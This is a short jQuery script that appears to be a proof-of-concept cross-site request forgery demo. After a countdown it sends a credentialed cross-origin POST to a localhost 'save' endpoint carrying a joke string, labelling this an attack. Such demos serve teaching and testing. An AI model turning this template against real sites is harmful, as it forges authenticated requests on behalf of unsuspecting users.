$(() => {
    //FUNCTIONS
    let sleep = ms => {
        return new Promise(res => {
            setTimeout(res, ms)
        })
    }

    //VARS
    let waitingTime = 3;
    let statusNode = $("#status")
    //MAIN
    async function main(){
        for (let i = 1; i <= waitingTime; i++){
            statusNode.text(`Starting in ${i}`)
            await sleep(1000)
        }

        statusNode.text("Launching attack..")

        $.ajaxSetup({
            type: "POST",
            data: {},
            dataType: 'json',
            xhrFields: {
               withCredentials: true
            },
            crossDomain: true
        });

        $.ajax({
            url: "http://localhost/save",
            data: {data: "DD is a giant loaf"},
            error: () => {
                statusNode.text("Processed attack")
            }
        })
        //main attack
    }

    main()
})